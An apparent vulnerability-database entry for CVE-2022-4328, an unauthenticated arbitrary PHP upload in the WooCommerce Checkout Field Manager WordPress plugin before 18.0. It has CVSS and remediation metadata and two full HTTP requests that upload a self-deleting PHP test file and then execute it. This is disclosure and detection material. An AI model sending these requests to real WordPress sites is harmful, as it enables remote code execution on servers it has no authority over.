---
layout: post
cve_id: CVE-2022-4328
title: WooCommerce Checkout Field Manager < 18.0 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2022/CVE-2022-4328.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-4328.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary PHP files through the cfom_upload_file
  AJAX action without validation, achieving remote code execution on the WordPress
  server and potentially compromising the entire WooCommerce installation.

  '
remediation: 'Fixed in version 18.0

  '
reference:
- https://wpscan.com/vulnerability/4dc72cd2-81d7-4a66-86bd-c9cfaf690eed
- https://wordpress.org/plugins/n-media-woocommerce-checkout-fields/
- https://nvd.nist.gov/vuln/detail/CVE-2022-4328
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-4328
  cwe-id: CWE-434
  epss-score: 0.82956
  epss-percentile: 0.99224
  cpe: cpe:2.3:a:najeebmedia:woocommerce_checkout_field_manager:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: najeebmedia
  product: woocommerce_checkout_field_manager
  framework: wordpress
tags:
- cve2022
- cve
- wp
- n-media-woocommerce-checkout-fields
- wpscan
- rce
- wordpress
- wp-plugin
- intrusive
- najeebmedia
- fileupload
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The WooCommerce Checkout Field Manager WordPress plugin before 18.0 does not validate files to be uploaded, which could allow unauthenticated attackers to upload arbitrary files such as PHP on the server.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php?action=cfom_upload_file&name=38FDNRMPKrRLjp3Ex4QMwG8batz.pHp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Connection: close
Content-Length: 276
Content-Type: multipart/form-data; boundary=------------------------22728be7b3104597
Accept-Encoding: gzip

--------------------------22728be7b3104597
Content-Disposition: form-data; name="file"; filename="38FDNRMPKrRLjp3Ex4QMwG8batz.php"
Content-Type: application/octet-stream

<?php echo md5("CVE-2022-4328");unlink(__FILE__);?>

--------------------------22728be7b3104597--
```

```nohighlight
GET /wp-content/uploads/cfom_files/38fdnrmpkrrljp3ex4qmwg8batz.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

